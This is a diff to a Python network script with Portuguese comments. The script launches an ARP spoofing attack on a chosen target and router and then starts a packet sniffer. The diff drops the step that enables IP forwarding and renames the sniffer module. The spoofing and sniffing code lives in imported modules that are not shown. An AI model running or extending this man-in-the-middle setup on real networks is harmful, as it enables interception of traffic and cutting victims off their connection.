@@ -55,9 +55,6 @@ def icmp_ping(dest_addr, timeout):
                     return response_time
             except socket.timeout:
                 return None
-    except PermissionError:
-        print("Erro de permissão: Execute o script como administrador/root.")
-        exit(1)
     finally:
         sock.close()
 
@@ -117,18 +114,15 @@ if __name__ == "__main__":
         import arp_spoofing
         from threading import Thread
 
-        # Habilitar IP Forwarding
-        arp_spoofing.habilitar_ip_forwarding()
-
         # Iniciar ataque ARP Spoofing
         spoof_thread = Thread(target=arp_spoofing.arp_spoof, args=(interface, ip_alvo, ip_roteador))
         spoof_thread.start()
 
         print("\n --- INICIANDO MONITORAMENTO ---")
-        import monitoramento
+        import traffic_control
 
         # Iniciar o sniffer
-        monitoramento.sniffer(interface)
+        traffic_control.sniffer(interface)
 
     except ValueError:
         print("Erro: entrada inválida. Use o formato: {interface} {ip_alvo} {ip_roteador}")
